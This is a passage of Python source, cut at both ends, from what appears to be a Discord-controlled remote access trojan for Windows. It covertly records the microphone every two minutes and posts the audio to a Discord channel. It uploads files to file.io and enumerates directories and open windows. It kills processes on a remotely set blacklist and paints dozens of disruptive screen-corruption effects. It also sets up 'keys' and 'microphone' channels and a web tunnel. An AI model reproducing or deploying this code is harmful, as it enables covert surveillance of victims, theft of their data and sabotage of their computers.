    asyncio.run_coroutine_threadsafe(send_recording(filename), bot.loop)


def record_mic_thread():
    while True:
        time.sleep(120)
        try:
            record_and_send(60)
        except Exception:
            pass


async def send_recording(filename):
    for guild in bot.guilds:
        mic_ch = guild.get_channel(cfg_get(guild.id, "microphone"))
        if mic_ch:
            try:
                await mic_ch.send(file=discord.File(filename))
            except Exception:
                pass
    try:
        os.remove(filename)
    except Exception:
        pass

BLACKLIST = set()
_bl_lock = threading.Lock()


def bl_load():
    try:
        conn = sqlite3.connect(DB_PATH)
        rows = conn.execute("SELECT process_name FROM blacklist").fetchall()
        conn.close()
        with _bl_lock:
            BLACKLIST.clear()
            BLACKLIST.update(str(r[0]).lower() for r in rows if r[0])
    except Exception:
        pass


def bl_has(name):
    with _bl_lock:
        return (name or "").lower() in BLACKLIST


def _bl_sweep():
    if not BLACKLIST:
        return
    try:
        for p in psutil.process_iter(["name"]):
            try:
                if bl_has(p.info.get("name")):
                    p.kill()
            except Exception:
                pass
    except Exception:
        pass


def _bl_wmi_loop():
    locator = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    svc = locator.ConnectServer(".", "root\\cimv2")
    watcher = svc.ExecNotificationQuery("SELECT * FROM Win32_ProcessStartTrace")
    while True:
        try:
            ev = watcher.NextEvent(1500)
        except Exception:
            _bl_sweep()
            time.sleep(0.25)
            continue
        if bl_has(ev.ProcessName):
            try:
                psutil.Process(ev.ProcessID).kill()
            except Exception:
                pass


def blacklist_watcher():
    pythoncom.CoInitialize()
    bl_load()
    try:
        while True:
            try:
                _bl_wmi_loop()
            except Exception:
                _bl_sweep()
                time.sleep(1.0)
    finally:
        try:
            pythoncom.CoUninitialize()
        except Exception:
            pass


def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0


def tree_directory(path, prefix=""):
    lines = []
    try:
        entries = sorted(os.listdir(path))
        for i, entry in enumerate(entries):
            full_path = os.path.join(path, entry)
            is_last = i == len(entries) - 1
            current = "└── " if is_last else "├── "
            lines.append(prefix + current + entry)
            if os.path.isdir(full_path):
                extension = "    " if is_last else "│   "
                lines.extend(tree_directory(full_path, prefix + extension))
    except Exception:
        pass
    return lines


def upload_fileio(filepath):
    try:
        with open(filepath, "rb") as f:
            response = requests.post("https://file.io", files={"file": f})
            return response.json().get("link")
    except Exception:
        return None


def enum_windows():
    titles = []

    def cb(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            t = win32gui.GetWindowText(hwnd)
            if t:
                titles.append(t)
        return True

    win32gui.EnumWindows(cb, None)
    return titles


def flash_screen(effect):
    hdc = win32gui.GetDC(0)
    width, height = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)

    if effect == "list":
        return [
            "invert\n", "noise\n", "lines\n", "invert_squares\n", "color_squares\n",
            "diagonal_lines\n", "snowfall\n", "hypnotic_spirals\n", "random_lines\n",
            "screen_collapse\n", "glitch_tunnel\n", "block_glitch\n", "matrix_rain\n",
            "pixel_melter\n", "vhs_static\n", "pixelate_wave\n", "rgb_split\n",
            "screen_shake\n", "corrupted_text_bars\n", "vortex_twirl\n", "scanline_flicker\n",
            "mirror_dimension\n", "screen_fracture\n", "color_bleed\n", "horizontal_tear\n",
            "digital_earthquake\n", "checkerboard_void\n", "strobe_stripes\n", "pixel_explosion\n",
            "wave_distortion\n", "quad_mirror\n", "crt_defrag\n", "vhs_tracking_loss\n",
            "invert_sweep\n", "static_snow_storm\n", "kaleidoscope_glitch\n", "screen_fold\n",
            "hologram_flicker\n", "blackhole_siphon\n", "corrupted_grid\n",
            "upside_down\n", "swirl_melt\n", "ghost_trail\n", "tunnel_zoom\n", "barcode_sweep\n",
            "ripple_pool\n", "shattered_mirror\n", "neon_outline\n", "pixel_sort\n", "datamosh\n",
            "chromatic_aberration\n", "crt_roll\n", "static_burst\n", "diamond_grid\n",
            "spiral_eye\n", "liquid_drip\n", "flare_beam\n", "mosaic_tiles\n", "inverted_pulse\n",
            "scan_beams\n", "wavy_water\n", "fractal_flash\n", "strobe_checker\n", "broken_lcd\n",
            "vertical_jitter\n", "hologram_shift\n", "tunnel_of_rings\n", "rainbow_sweep\n",
            "glitch_blocks\n", "negative_scan\n", "zoom_punch\n", "ripple_rings\n",
            "split_shuffle\n", "crt_power_off\n", "dot_matrix\n", "edge_shred\n", "smear_slide\n",
            "blink_outline\n", "noise_bands\n", "shear_wave\n", "spotlight_dark\n", "vertigo_spin\n"
        ]

    elif effect == "upside_down":
        for _ in range(40):
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)
            time.sleep(0.02)

    elif effect == "swirl_melt":
        for _ in range(400):
            y_pos = random.randint(0, height - 20)
            win32gui.BitBlt(hdc, random.randint(-45, 45), y_pos, width, 20, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "ghost_trail":
        for _ in range(80):
            dx = int(math.sin(time.time() * 6) * 18)
            dy = int(math.cos(time.time() * 4) * 12)
            win32gui.BitBlt(hdc, dx, dy, width, height, hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.02)

    elif effect == "tunnel_zoom":
        for _ in range(120):
            win32gui.BitBlt(hdc, width // 40, height // 40, width - width // 20, height - height // 20, hdc, 0, 0, win32con.SRCCOPY)

    elif effect == "barcode_sweep":
        for x_pos in range(0, width, 6):
            color = win32api.RGB(0, 0, 0) if random.random() > 0.5 else win32api.RGB(255, 255, 255)
            brush = win32gui.CreateSolidBrush(color)
            old = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, 0, random.randint(2, 5), height, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(brush)

    elif effect == "ripple_pool":
        for i in range(0, 900, 12):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(0, 200, 255))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Ellipse(hdc, width // 2 - i, height // 2 - i * 2 // 3, width // 2 + i, height // 2 + i * 2 // 3)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)

    elif effect == "shattered_mirror":
        for _ in range(300):
            sx = random.randint(0, width - 120)
            sy = random.randint(0, height - 120)
            win32gui.BitBlt(hdc, sx + random.randint(-14, 14), sy + random.randint(-14, 14), 120, 120, hdc, sx, sy, win32con.SRCINVERT)

    elif effect == "neon_outline":
        for i in range(0, 60, 3):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 3, win32api.RGB(random.randint(120, 255), random.randint(60, 255), 255))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Rectangle(hdc, i, i, width - i, height - i)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)

    elif effect == "pixel_sort":
        for _ in range(200):
            y_pos = random.randint(0, height - 8)
            win32gui.BitBlt(hdc, random.randint(-20, 20), y_pos, width, 8, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "datamosh":
        for _ in range(180):
            y_pos = random.randint(0, height - 60)
            win32gui.BitBlt(hdc, random.randint(-60, 60), y_pos, width, 60, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "chromatic_aberration":
        for _ in range(120):
            y_pos = random.randint(0, height - 30)
            win32gui.BitBlt(hdc, random.randint(4, 14), y_pos, width, 30, hdc, 0, y_pos, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, random.randint(-14, -4), y_pos, width, 30, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "crt_roll":
        for _ in range(160):
            win32gui.BitBlt(hdc, 0, 24, width, height - 24, hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.01)

    elif effect == "static_burst":
        for _ in range(40):
            for _ in range(400):
                win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), 3, 3, win32con.PATINVERT)
            time.sleep(0.03)

    elif effect == "diamond_grid":
        for _ in range(400):
            x_pos = random.randint(0, width - 80)
            y_pos = random.randint(0, height - 80)
            s = random.randint(20, 80)
            win32gui.PatBlt(hdc, x_pos, y_pos, s, s, win32con.PATINVERT)

    elif effect == "spiral_eye":
        for a in range(0, 1440, 4):
            rad = math.radians(a)
            r = a // 2
            x1 = int(width / 2 + math.cos(rad) * r)
            y1 = int(height / 2 + math.sin(rad) * r)
            win32gui.PatBlt(hdc, x1, y1, 4, 4, win32con.PATINVERT)

    elif effect == "liquid_drip":
        for _ in range(500):
            x_pos = random.randint(0, width)
            win32gui.BitBlt(hdc, x_pos, random.randint(0, 120), 5, random.randint(40, 300), hdc, x_pos, 0, win32con.SRCCOPY)

    elif effect == "flare_beam":
        for x_pos in range(0, width + 80, 20):
            win32gui.BitBlt(hdc, x_pos, 0, 60, height, hdc, max(0, x_pos - 20), 0, win32con.SRCCOPY)

    elif effect == "mosaic_tiles":
        s = 24
        for _ in range(400):
            x_pos = random.randint(0, width // s - 1) * s
            y_pos = random.randint(0, height // s - 1) * s
            win32gui.BitBlt(hdc, x_pos, y_pos, s, s, hdc, x_pos + random.randint(-s, s), y_pos, win32con.SRCCOPY)

    elif effect == "inverted_pulse":
        for _ in range(24):
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)
            time.sleep(0.05)

    elif effect == "scan_beams":
        for i in range(0, height, 20):
            win32gui.PatBlt(hdc, 0, i, width, 18, win32con.DSTINVERT)
            time.sleep(0.01)

    elif effect == "wavy_water":
        for y_pos in range(0, height, 8):
            win32gui.BitBlt(hdc, int(math.sin(y_pos / 24.0) * 22), y_pos, width, 8, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "fractal_flash":
        for _ in range(300):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Ellipse(hdc, random.randint(0, width // 2), random.randint(0, height // 2), random.randint(40, width), random.randint(40, height))
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)

    elif effect == "strobe_checker":
        s = 64
        for x_pos in range(0, width, s):
            for y_pos in range(0, height, s):
                if (x_pos // s + y_pos // s) % 2 == 0:
                    win32gui.PatBlt(hdc, x_pos, y_pos, s, s, win32con.PATINVERT)
        time.sleep(0.4)

    elif effect == "broken_lcd":
        for _ in range(600):
            win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), random.randint(2, 60), random.randint(2, 60), win32con.PATINVERT)

    elif effect == "vertical_jitter":
        for x_pos in range(0, width, 24):
            win32gui.BitBlt(hdc, x_pos, random.randint(-8, 8), 24, height, hdc, x_pos, 0, win32con.SRCCOPY)

    elif effect == "hologram_shift":
        for _ in range(120):
            win32gui.BitBlt(hdc, int(math.sin(time.time() * 4) * 20), 0, width, height, hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.02)

    elif effect == "tunnel_of_rings":
        for r in range(0, min(width, height) // 2, 14):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(255, 180, 0))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Ellipse(hdc, width // 2 - r, height // 2 - r, width // 2 + r, height // 2 + r)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)

    elif effect == "rainbow_sweep":
        for y_pos in range(0, height, 12):
            h = int((y_pos + time.time() * 200) % 360)
            brush = win32gui.CreateSolidBrush(win32api.RGB(*(int(127 + 127 * math.sin(math.radians(h + o))) for o in (0, 120, 240))))
            old = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, 0, y_pos, width, 6, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(brush)

    elif effect == "glitch_blocks":
        for _ in range(600):
            win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), random.randint(30, 220), random.randint(10, 60), win32con.DSTINVERT)

    elif effect == "negative_scan":
        for y_pos in range(0, height, 30):
            win32gui.PatBlt(hdc, 0, y_pos, width, 120, win32con.PATINVERT)
            time.sleep(0.02)

    elif effect == "zoom_punch":
        for _ in range(60):
            win32gui.BitBlt(hdc, -width // 20, -height // 20, width + width // 10, height + height // 10, hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.03)

    elif effect == "ripple_rings":
        for r in range(0, min(width, height) // 2, 12):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(0, 255, 200))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Ellipse(hdc, width // 2 - r, height // 2 - r, width // 2 + r, height // 2 + r)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)

    elif effect == "split_shuffle":
        for _ in range(160):
            y_pos = random.randint(0, height - 80)
            win32gui.BitBlt(hdc, 0, random.randint(0, height - 80), width, 80, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "crt_power_off":
        for _ in range(40):
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.BLACKNESS)
            win32gui.BitBlt(hdc, width // 2 - 2, height // 4, 4, height // 2, hdc, width // 2 - 2, height // 4, win32con.SRCCOPY)
            time.sleep(0.03)

    elif effect == "dot_matrix":
        for y_pos in range(0, height, 8):
            for x_pos in range(0, width, 8):
                if random.random() > 0.6:
                    win32gui.PatBlt(hdc, x_pos, y_pos, 4, 4, win32con.PATINVERT)

    elif effect == "edge_shred":
        for _ in range(200):
            x_pos = random.randint(0, width - 120)
            win32gui.BitBlt(hdc, x_pos, random.randint(-40, 40), 120, height, hdc, x_pos, 0, win32con.SRCCOPY)

    elif effect == "smear_slide":
        for i in range(8):
            win32gui.BitBlt(hdc, int(math.sin(time.time() * 2 + i) * 40), int(math.cos(time.time() + i) * 20), width, height, hdc, 0, 0, win32con.SRCPAINT)
            time.sleep(0.02)

    elif effect == "blink_outline":
        for _ in range(10):
            pen = win32gui.CreatePen(win32con.PS_SOLID, 8, win32api.RGB(255, 0, 0))
            old = win32gui.SelectObject(hdc, pen)
            win32gui.Rectangle(hdc, 4, 4, width - 4, height - 4)
            win32gui.SelectObject(hdc, old)
            win32gui.DeleteObject(pen)
            time.sleep(0.15)
            win32gui.Rectangle(hdc, 4, 4, width - 4, height - 4)

    elif effect == "noise_bands":
        for _ in range(400):
            win32gui.PatBlt(hdc, 0, random.randint(0, height), width, random.randint(3, 26), win32con.PATINVERT)

    elif effect == "shear_wave":
        for y_pos in range(0, height, 12):
            win32gui.BitBlt(hdc, int((y_pos * 0.12 + math.sin(time.time() * 2) * 30) % 60) - 30, y_pos, width, 12, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "spotlight_dark":
        win32gui.PatBlt(hdc, 0, 0, width, height, win32con.BLACKNESS)
        r = 160
        win32gui.BitBlt(hdc, width // 2 - r, height // 2 - r, r * 2, r * 2, hdc, width // 2 - r, height // 2 - r, win32con.SRCCOPY)

    elif effect == "vertigo_spin":
        for _ in range(80):
            win32gui.BitBlt(hdc, width // 60, 0, width - width // 30, height, hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.02)

    elif effect == "invert":
        start_time = time.time()
        while time.time() - start_time < 10:
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)
            time.sleep(0.01)

    elif effect == "noise":
        for _ in range(5000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            size = random.randint(20, 150)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "lines":
        for _ in range(50):
            step = random.randint(2, 10)
            for y_pos in range(0, height, step):
                win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(1, 5), win32con.PATINVERT)
            time.sleep(0.05)

    elif effect == "invert_squares":
        for _ in range(1500):
            rx1 = random.randint(0, width)
            ry1 = random.randint(0, height)
            w_box = random.randint(50, 400)
            h_box = random.randint(50, 400)
            win32gui.PatBlt(hdc, rx1, ry1, w_box, h_box, win32con.PATINVERT)

    elif effect == "color_squares":
        for _ in range(3000):
            x_pos = random.randint(0, width)
            y_pos = random.randint(0, height)
            size = random.choice([10, 20, 40, 80])
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, y_pos, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "diagonal_lines":
        for _ in range(300):
            x_pos = random.randint(0, width)
            y_pos = random.randint(0, height)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, 0, random.randint(1, 4), height, win32con.PATCOPY)
            win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(1, 4), win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "snowfall":
        for _ in range(50):
            stars = [(random.randint(0, width), random.randint(0, height), random.randint(2, 8)) for _ in range(300)]
            brush = win32gui.CreateSolidBrush(win32api.RGB(255, 255, 255))
            old_brush = win32gui.SelectObject(hdc, brush)
            for rx, ry, size in stars:
                win32gui.PatBlt(hdc, rx, ry, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)
            time.sleep(0.05)

    elif effect == "hypnotic_spirals":
        for angle in range(0, 1080, 5):
            radius = 1000
            rad = math.radians(angle)
            x1 = int(width / 2 + radius * math.cos(rad))
            y1 = int(height / 2 - radius * math.sin(rad))
            x2 = int(width / 2 + radius * math.cos(rad + math.pi))
            y2 = int(height / 2 - radius * math.sin(rad + math.pi))
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, random.randint(1, 5), color)
            old_pen = win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.SelectObject(hdc, old_pen)
            win32gui.DeleteObject(pen)

    elif effect == "random_lines":
        for _ in range(800):
            x1 = random.randint(0, width)
            y1 = random.randint(0, height)
            x2 = random.randint(0, width)
            y2 = random.randint(0, height)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, random.randint(1, 6), color)
            old_pen = win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.SelectObject(hdc, old_pen)
            win32gui.DeleteObject(pen)

    elif effect == "screen_collapse":
        for _ in range(600):
            sx = random.randint(0, width - 100)
            sy = random.randint(0, height - 100)
            dx = sx + random.randint(-80, 80)
            dy = sy + random.randint(-80, 80)
            w = random.randint(50, 400)
            h = random.randint(50, 400)
            win32gui.BitBlt(hdc, dx, dy, w, h, hdc, sx, sy, win32con.SRCCOPY)

    elif effect == "block_glitch":
        for _ in range(1500):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            rw = random.randint(20, 300)
            rh = random.randint(5, 50)
            mode = random.choice([win32con.PATINVERT, win32con.DSTINVERT])
            win32gui.PatBlt(hdc, rx, ry, rw, rh, mode)

    elif effect == "glitch_tunnel":
        for i in range(0, min(width, height) // 2, 8):
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, i, i, width - (i * 2), height - (i * 2), win32con.PATINVERT)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "matrix_rain":
        brush = win32gui.CreateSolidBrush(win32api.RGB(0, 255, 70))
        old_brush = win32gui.SelectObject(hdc, brush)
        for _ in range(2000):
            rx = random.randint(0, width // 15) * 15
            ry = random.randint(0, height // 20) * 20
            win32gui.PatBlt(hdc, rx, ry, 10, 18, win32con.PATCOPY)
        win32gui.SelectObject(hdc, old_brush)
        win32gui.DeleteObject(brush)

    elif effect == "pixel_melter":
        for _ in range(800):
            sx = random.randint(0, width - 20)
            sy = random.randint(0, height - 100)
            w = random.randint(5, 30)
            h = random.randint(20, 100)
            win32gui.BitBlt(hdc, sx, sy + random.randint(10, 40), w, h, hdc, sx, sy, win32con.SRCCOPY)

    elif effect == "vhs_static":
        for _ in range(120):
            y_pos = random.randint(0, height - 30)
            win32gui.BitBlt(hdc, random.randint(-40, 40), y_pos, width, random.randint(10, 30), hdc, 0, y_pos, win32con.SRCCOPY)
            win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(2, 6), win32con.PATINVERT)
            time.sleep(0.02)

    elif effect == "pixelate_wave":
        for _ in range(500):
            rx = random.randint(0, width - 100)
            ry = random.randint(0, height - 100)
            size = random.randint(20, 80)
            win32gui.StretchBlt(hdc, rx, ry, size, size, hdc, rx, ry, size // 4, size // 4, win32con.SRCCOPY)

    elif effect == "rgb_split":
        for _ in range(300):
            h_slice = random.randint(10, 80)
            y_pos = random.randint(0, height - h_slice)
            shift = random.choice([-50, -25, 25, 50])
            win32gui.BitBlt(hdc, shift, y_pos, width, h_slice, hdc, 0, y_pos, win32con.SRCINVERT)

    elif effect == "screen_shake":
        for _ in range(80):
            dx = random.randint(-30, 30)
            dy = random.randint(-30, 30)
            win32gui.BitBlt(hdc, dx, dy, width - abs(dx), height - abs(dy), hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.01)

    elif effect == "corrupted_text_bars":
        for _ in range(1000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            rw = random.randint(50, 400)
            rh = random.randint(2, 10)
            color = win32api.RGB(random.choice([0, 255]), random.choice([0, 255]), random.choice([0, 255]))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, rw, rh, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "vortex_twirl":
        center_x, center_y = width // 2, height // 2
        for r in range(50, min(width, height) // 2, 15):
            angle_shift = random.randint(-20, 20)
            win32gui.BitBlt(hdc, center_x - r + angle_shift, center_y - r - angle_shift, r * 2, r * 2, hdc, center_x - r, center_y - r, win32con.SRCPAINT)

    elif effect == "scanline_flicker":
        for _ in range(100):
            for y_pos in range(0, height, random.randint(4, 12)):
                win32gui.PatBlt(hdc, 0, y_pos, width, 1, win32con.BLACKNESS)
            time.sleep(0.01)

    elif effect == "mirror_dimension":
        for _ in range(50):
            half_w = width // 2
            win32gui.StretchBlt(hdc, half_w, 0, half_w, height, hdc, half_w, 0, -half_w, height, win32con.SRCCOPY)
            time.sleep(0.02)

    elif effect == "screen_fracture":
        for _ in range(400):
            rx = random.randint(0, width - 200)
            ry = random.randint(0, height - 200)
            rw = random.randint(100, 300)
            rh = random.randint(100, 300)
            win32gui.BitBlt(hdc, rx + random.randint(-40, 40), ry + random.randint(-40, 40), rw, rh, hdc, rx, ry, win32con.SRCINVERT)

    elif effect == "color_bleed":
        for _ in range(600):
            rx = random.randint(0, width - 50)
            ry = random.randint(0, height)
            rw = random.randint(30, 150)
            color = win32api.RGB(255, 0, random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, rw, 4, win32con.SRCPAINT)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "horizontal_tear":
        for _ in range(150):
            y_pos = random.randint(0, height - 50)
            h_slice = random.randint(5, 30)
            shift = random.randint(-150, 150)
            win32gui.BitBlt(hdc, shift, y_pos, width, h_slice, hdc, 0, y_pos, win32con.SRCCOPY)
            time.sleep(0.01)

    elif effect == "digital_earthquake":
        for _ in range(120):
            dx = random.randint(-60, 60)
            dy = random.randint(-60, 60)
            win32gui.BitBlt(hdc, dx, dy, width, height, hdc, 0, 0, win32con.SRCPAINT)
            time.sleep(0.01)

    elif effect == "checkerboard_void":
        size = 80
        for x_pos in range(0, width, size):
            for y_pos in range(0, height, size):
                if (x_pos // size + y_pos // size) % 2 == 0:
                    win32gui.PatBlt(hdc, x_pos, y_pos, size, size, win32con.PATINVERT)
        time.sleep(0.5)

    elif effect == "strobe_stripes":
        for _ in range(30):
            for x_pos in range(0, width, 40):
                win32gui.PatBlt(hdc, x_pos, 0, 20, height, win32con.DSTINVERT)
            time.sleep(0.03)

    elif effect == "pixel_explosion":
        for _ in range(5000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            win32gui.PatBlt(hdc, rx, ry, random.randint(2, 6), random.randint(2, 6), win32con.PATINVERT)

    elif effect == "wave_distortion":
        for y_pos in range(0, height, 10):
            offset = int(math.sin(y_pos / 20.0) * 30)
            win32gui.BitBlt(hdc, offset, y_pos, width, 10, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "quad_mirror":
        hw, hh = width // 2, height // 2
        win32gui.BitBlt(hdc, hw, 0, hw, hh, hdc, 0, 0, win32con.SRCCOPY)
        win32gui.BitBlt(hdc, 0, hh, hw, hh, hdc, 0, 0, win32con.SRCCOPY)
        win32gui.BitBlt(hdc, hw, hh, hw, hh, hdc, 0, 0, win32con.SRCCOPY)

    elif effect == "crt_defrag":
        for y_pos in range(0, height, 4):
            if random.random() > 0.4:
                win32gui.PatBlt(hdc, 0, y_pos, width, 2, win32con.BLACKNESS)

    elif effect == "vhs_tracking_loss":
        for _ in range(80):
            y_pos = random.randint(0, height - 100)
            win32gui.BitBlt(hdc, 0, y_pos, width, 80, hdc, 0, y_pos + random.randint(-20, 20), win32con.SRCCOPY)
            win32gui.PatBlt(hdc, 0, y_pos + 40, width, 10, win32con.PATINVERT)
            time.sleep(0.01)

    elif effect == "invert_sweep":
        for x_pos in range(0, width, 20):
            win32gui.PatBlt(hdc, x_pos, 0, 20, height, win32con.PATINVERT)
            time.sleep(0.005)

    elif effect == "static_snow_storm":
        for _ in range(3000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            val = random.choice([0, 255])
            brush = win32gui.CreateSolidBrush(win32api.RGB(val, val, val))
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, 4, 4, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "kaleidoscope_glitch":
        for _ in range(200):
            rx = random.randint(0, width // 2)
            ry = random.randint(0, height // 2)
            rw = random.randint(50, 150)
            rh = random.randint(50, 150)
            win32gui.BitBlt(hdc, width - rx - rw, ry, rw, rh, hdc, rx, ry, win32con.SRCINVERT)
            win32gui.BitBlt(hdc, rx, height - ry - rh, rw, rh, hdc, rx, ry, win32con.SRCINVERT)

    elif effect == "screen_fold":
        for i in range(0, width // 2, 10):
            win32gui.BitBlt(hdc, i, 0, 5, height, hdc, width - i, 0, win32con.SRCCOPY)

    elif effect == "hologram_flicker":
        for _ in range(60):
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)
            time.sleep(0.01)
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)

    elif effect == "blackhole_siphon":
        cx, cy = width // 2, height // 2
        for r in range(min(width, height) // 2, 10, -10):
            win32gui.BitBlt(hdc, cx - r + 5, cy - r + 5, r * 2 - 10, r * 2 - 10, hdc, cx - r, cy - r, win32con.SRCCOPY)

    elif effect == "corrupted_grid":
        for x_pos in range(0, width, 50):
            for y_pos in range(0, height, 50):
                if random.random() > 0.5:
                    win32gui.PatBlt(hdc, x_pos, y_pos, 45, 45, win32con.PATINVERT)

    else:
        win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)

    if effect != "list":
        win32gui.ReleaseDC(0, hdc)

CATEGORY_IDS = {}
CHANNEL_IDS = {}


def init_channels_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS guild_config
                 (guild_id INTEGER, key TEXT, value INTEGER, PRIMARY KEY (guild_id, key))""")
    conn.commit()
    conn.close()


def get_guild_value(guild_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM guild_config WHERE guild_id = ? AND key = ?", (guild_id, key))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None


def set_guild_value(guild_id, key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO guild_config VALUES (?, ?, ?)", (guild_id, key, value))
    conn.commit()
    conn.close()


def cfg_get(guild_id, key, default=None):
    return CHANNEL_IDS.get(guild_id, {}).get(key, default)


init_db()
init_channels_db()

CHANNEL_NAMES = {
    "info": "ℹ️〡info",
    "cmds": "🤖〡cmds",
    "keys": "🔑〡keys",
    "microphone": "🎤〡microphone",
}

CHANNEL_ORDER = ["info", "cmds", "keys", "microphone"]

WEB_PORT = 8765
WEB_HOST = "0.0.0.0"
WEB_TOKEN = ""
WEB_URL = ""
WEB_RUNNER = None
WEB_TUNNEL = None
WEB_TUNNEL_URL = ""
WEB_BUSY = False
_WS_OPEN = 0

WEB_CSS = """
